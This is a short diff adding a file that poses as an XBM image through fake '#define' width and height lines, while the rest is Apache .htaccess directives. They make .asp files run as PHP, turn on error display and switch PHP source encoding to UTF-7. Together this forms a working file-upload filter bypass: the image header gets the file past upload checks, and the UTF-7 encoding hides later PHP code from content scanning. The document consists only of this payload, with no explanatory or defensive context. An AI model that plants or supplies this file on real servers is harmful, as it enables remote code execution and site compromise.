@@ -1,0 +1,6 @@
+#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
+#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
+AddType application/x-httpd-php .asp
+php_flag display_errors on
+php_flag zend.multibyte 1
+php_value zend.script_encoding "UTF-7"
